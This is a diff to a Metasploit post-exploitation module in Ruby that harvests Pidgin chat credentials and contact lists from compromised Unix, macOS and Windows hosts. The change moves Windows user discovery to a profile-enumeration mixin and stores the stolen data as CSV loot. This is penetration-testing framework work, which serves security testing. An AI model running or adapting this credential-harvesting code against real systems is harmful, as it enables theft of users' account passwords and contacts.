@@ -13,10 +13,12 @@ require 'msf/core'
 require 'rex'
 require 'rexml/document'
 require 'msf/core/post/file'
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::File
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info(info,
@@ -43,6 +45,7 @@ class Metasploit3 < Msf::Post
 
 # TODO add support for collecting logs
 	def run
+		paths = []
 		case session.platform
 		when /unix|linux|bsd/
 			@platform = :unix
@@ -51,28 +54,17 @@ class Metasploit3 < Msf::Post
 			@platform = :osx
 			paths = enum_users_unix
 		when /win/
-			@platform = :windows
-			drive = session.fs.file.expand_path("%SystemDrive%")
-			os = session.sys.config.sysinfo['OS']
-
-			if os =~ /Windows 7|Vista|2008/
-				@appdata = '\\AppData\\Roaming'
-				@users = drive + '\\Users'
-			else
-				@appdata = '\\Application Data'
-				@users = drive + '\\Documents and Settings'
+			profiles = grab_user_profiles()
+			profiles.each do |user|
+				next if user['AppData'] == nil
+				pdir = check_pidgin(user['AppData'])
+				paths << pdir if pdir
 			end
-
-			if session.type != "meterpreter"
-				print_error "Only meterpreter sessions are supported on windows hosts"
-				return
-			end
-			paths = enum_users_windows
 		else
 			print_error "Unsupported platform #{session.platform}"
 			return
 		end
-		if paths.empty?
+		if paths.nil? or paths.empty?
 			print_status("No users found with a .purple directory")
 			return
 		end
@@ -116,30 +108,7 @@ class Metasploit3 < Msf::Post
 		return paths
 	end
 
-	def enum_users_windows
-		paths = Array.new
 
-		if got_root?
-			session.fs.dir.foreach(@users) do |path|
-				next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
-				purpledir = "#{@users}\\#{path}#{@appdata}\\"
-				dir = check_pidgin(purpledir)
-				if dir
-					paths << dir
-				end
-			end
-		else
-			print_status "We do not have SYSTEM checking #{whoami} account"
-			# not root
-			path = "#{@users}\\#{whoami}#{@appdata}"
-			session.fs.dir.foreach(path) do |dir|
-				if dir =~ /\.purple/
-					paths << "#{path}\\#{dir}"
-				end
-			end
-		end
-		return paths
-	end
 
 	def check_pidgin(purpledir)
 		print_status("Checking for Pidgin profile in: #{purpledir}")
@@ -252,10 +221,10 @@ class Metasploit3 < Msf::Post
 		end
 
 		if datastore['CONTACTS']
-			store_loot("pidgin.contacts", "text/plain", session, buddylists.to_s, "pidgin_contactlists.txt", "Pidgin Contacts")
+			store_loot("pidgin.contacts", "text/plain", session, buddylists.to_csv, "pidgin_contactlists.txt", "Pidgin Contacts")
 		end
 
-		store_loot("pidgin.creds", "text/plain", session, credentials.to_s, "pidgin_credentials.txt", "Pidgin Credentials")
+		store_loot("pidgin.creds", "text/plain", session, credentials.to_csv, "pidgin_credentials.txt", "Pidgin Credentials")
 	end
 
 	def parse_accounts(data)
@@ -298,7 +267,7 @@ class Metasploit3 < Msf::Post
 				contact['name'] = bcontact.elements['buddy'].elements['name'].text rescue "<unknown>"
 				contact['account'] = bcontact.elements['buddy'].attributes['account'] rescue "<unknown>"
 				contact['protocol'] = bcontact.elements['buddy'].attributes['proto'] rescue "<unknown>"
-				
+
 				if bcontact.elements['buddy'].elements['alias']
 					contact['alias'] = bcontact.elements['buddy'].elements['alias'].text
 				else
